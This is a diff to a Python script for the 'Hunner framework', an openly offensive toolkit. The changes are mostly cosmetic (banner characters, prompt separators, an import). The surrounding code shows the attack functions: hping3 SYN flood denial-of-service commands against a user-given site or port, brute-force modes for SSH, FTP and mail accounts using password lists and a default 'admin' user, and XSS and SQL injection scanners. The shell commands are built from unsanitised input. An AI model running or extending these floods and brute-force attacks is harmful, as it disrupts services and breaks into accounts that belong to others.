@@ -1,7 +1,8 @@
 # Create python3 
 # Author B3avers
+# coding=utf-8 -*-
 # 
-import urllib.request  as urllib2 
+import urllib as urllib2 
 import re
 import sys,os
 import random
@@ -30,36 +31,36 @@ def info():
 def heads():
 	global head
 	head = E+H+"""
-```````````````````¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
-```````````````¶¶¶`````````````````¶¶¶
-````````````¶¶````````````````````````¶¶¶
-```````````¶¶````````````````````````````¶¶
-`````````¶¶````````````````````````````````¶
-````````¶¶`````````"""+W+'Hunner  framework'+E+H+"""````````¶¶
-````````¶```````````"""+F+'Create  B3-v3r'+H+"""```````````¶¶
-```````¶¶```````````````````````````````````¶¶
-```````¶`````````````````````````````````````¶
-```````¶`````````````"""+B+'Version 1.0'+H+"""`````````````¶
-```````¶`````````````````````````````````````¶
-```````¶¶```````````````````````````````````¶¶
-```````¶¶``````¶¶¶¶¶````````````¶¶¶¶¶```````¶¶
-````````¶`¶``¶¶¶¶¶¶¶¶¶````````¶¶¶¶¶¶¶¶¶`````¶¶
-````````¶¶``¶¶"""+F+'Hunner'+H+"""¶¶¶``````¶¶¶"""+F+'Hunner'+H+"""¶¶``¶¶¶
-````````¶¶``¶¶¶¶¶¶¶¶¶¶````````¶¶¶¶¶¶¶¶¶¶``¶¶
-````````¶`````¶¶¶¶```````````````¶¶¶¶¶`````¶¶
-`````¶¶`¶¶``````````````¶`¶````````````````¶¶
-```¶¶```¶¶¶¶```````````¶¶`¶¶```````````````¶¶¶``¶¶
-``¶¶`````¶`¶¶¶¶¶¶¶````````¶````````¶¶¶¶¶¶¶¶¶`````¶¶
-```¶``````¶¶````¶¶````````````````¶``````¶¶`````¶¶
-``¶¶````````¶¶¶`¶¶¶`¶`¶``¶``¶``¶``¶````¶¶```````¶¶
-```¶¶¶``¶``````¶¶¶¶``````¶`````¶¶¶`¶¶¶``````````¶
-``````````¶¶¶¶¶````¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶`````¶¶¶¶¶¶¶¶
-```````````````¶¶¶````¶¶¶"""+W+'The'+H+"""¶¶`````¶¶¶¶
-``````````````````¶¶¶`"""+W+'Hacking'+H+"""``¶¶¶
-````````````````````¶¶¶``````¶¶¶¶
-````````````````¶¶¶`````¶¶¶¶¶````¶¶
-```````````¶```````¶¶¶¶``````¶¶¶```````¶¶
-```````````¶¶````¶¶`````````````¶¶``````¶
+```````````````````$$$$$$$$$$$$$$$
+```````````````$$$`````````````````$$$
+````````````$$````````````````````````$$$
+```````````$$````````````````````````````$$
+`````````$$````````````````````````````````$
+````````$$`````````"""+W+'Hunner  framework'+E+H+"""````````$$
+````````$```````````"""+F+'Create  B3-v3r'+H+"""```````````$$
+```````$$```````````````````````````````````$$
+```````$`````````````````````````````````````$
+```````$`````````````"""+B+'Version 1.0'+H+"""`````````````$
+```````$`````````````````````````````````````$
+```````$$```````````````````````````````````$$
+```````$$``````$$$$$````````````$$$$$```````$$
+````````$`$``$$$$$$$$$````````$$$$$$$$$`````$$
+````````$$``$$"""+F+'Hunner'+H+"""$$$``````$$$"""+F+'Hunner'+H+"""$$``$$$
+````````$$``$$$$$$$$$$````````$$$$$$$$$$``$$
+````````$`````$$$$```````````````$$$$$`````$$
+`````$$`$$``````````````$`$````````````````$$
+```$$```$$$$```````````$$`$$```````````````$$$``$$
+``$$`````$`$$$$$$$````````$````````$$$$$$$$$`````$$
+```$``````$$````$$````````````````$``````$$`````$$
+``$$````````$$$`$$$`$`$``$``$``$``$````$$```````$$
+```$$$``$``````$$$$``````$`````$$$`$$$``````````$
+``````````$$$$$````$$$$$$$$$$$$$$$`````$$$$$$$$
+```````````````$$$````$$$"""+W+'The'+H+"""$$`````$$$$
+``````````````````$$$`"""+W+'Hacking'+H+"""``$$$
+````````````````````$$$``````$$$$
+````````````````$$$`````$$$$$````$$
+```````````$```````$$$$``````$$$```````$$
+```````````$$````$$`````````````$$``````$
 	"""+E
 def banner():
 	text1 = B+"""
@@ -104,7 +105,7 @@ def XXS():
 	banner()
 	print('Enter site:')
 	try:
-		site = input(B+'Hunner»XXS»'+E) 
+		site = input(B+'Hunner=>XXS=>'+E) 
 	except:
 		print(F+'\nError'+E)
 		
@@ -157,7 +158,7 @@ def SQL():
 	os.system('clear')
 	banner()
 	print(G+'Enter site:'+E)
-	site = input(B+'Hunner»SqlScaner»'+E)
+	site = input(B+'Hunner=>SqlScaner=>'+E)
 	if "http://" not in site and "https://"not in site:
 		site = 'http://' + site
 	else:
@@ -197,16 +198,16 @@ def Dos():
 	os.system('clear')
 	banner()
 	print('Enter site:')
-	site = input(B+'Hunner»Dos»'+E)
+	site = input(B+'Hunner=>Dos=>'+E)
 	print('''Enter level:
 		1) High dos
 		2) Dos port
  		3) Low dos''')
-	level = int(input(B+'Hunner»Dos»Level»'+E))
+	level = int(input(B+'Hunner=>Dos=>Level=>'+E))
 	if level == 1:
 		os.system('hping3 -S -P --flood -V '+site)
 	if level == 2:
-		port = input(B+'Hunner»Dos»Level»Port»'+E)
+		port = input(B+'Hunner=>Dos=>Level=>Port=>'+E)
 		os.system('hping3 -S -P --flood -V -p '+port+' '+ site)
 	if level == 3:
 		os.system('python3 modules/dos.py '+site)
@@ -217,14 +218,14 @@ def SSH_Brut():
 	try:
 		print(F+'Brutforse ssh mode!!'+E)
 		print('Enter target host:')
-		host = input(W+'Hunner»SSH»Host»'+E)
+		host = input(W+'Hunner=>SSH=>Host=>'+E)
 		print(G+'Enter username:'+E)
 		print(G+'Default: admin'+E)
-		user = input(W+'Hunner»SSH»User»'+E)
+		user = input(W+'Hunner=>SSH=>User=>'+E)
 		if user == "":
 			user = 'admin'
 		print(G+'Enter password file:'+E)
-		password = input(W+'Hunner»SSH»Password»'+E)
+		password = input(W+'Hunner=>SSH=>Password=>'+E)
 
 		if password == "":
 			print('Enter password file')
@@ -240,12 +241,12 @@ def FTP_Brut():
 	banner()
 	print(F+'Brutforse ftp mode!!'+E)
 	print(B+'Enter host:'+E)
-	host = input(W+'Hunner»Ftp»Host»'+E)
+	host = input(W+'Hunner=>Ftp=>Host=>'+E)
 	print(B+'Enter user:'+E)
 	print(F+'Default: admin')
-	user = input(W+'Hunner»Ftp»User»'+E)
+	user = input(W+'Hunner=>Ftp=>User=>'+E)
 	print(B+'Enter password file:'+E)
-	password_list = input(W+'Hunner»Ftp»Password»'+E)
+	password_list = input(W+'Hunner=>Ftp=>Password=>'+E)
 	if user == '':
 		user = 'admin'
 	if password_list == '':
@@ -259,9 +260,9 @@ def mail():
 	banner()
 	print(H+'Brut mail account'+E)
 	print(B+'Enter login:'+E)
-	mail = input(W+'Hunner»Mail»Login»'+E)
+	mail = input(W+'Hunner=>Mail=>Login=>'+E)
 	print(B+'Enter password list:'+E)
-	password = input(W+'Hunner»Mail»Password»'+E)
+	password = input(W+'Hunner=>Mail=>Password=>'+E)
 	if password == '':
 		print(F+'Password list: password/password_list.txt'+E)
 		password = 'password/password_list.txt'
@@ -286,7 +287,7 @@ def Main_Menu():
   	6) Brute mails
   	'''+W+'''-------------------\n'''+E)
 	try:
-		v = input('Hunner-»')
+		v = input('Hunner-=>')
 	except:
 		print(' Good by ')
 		exit()
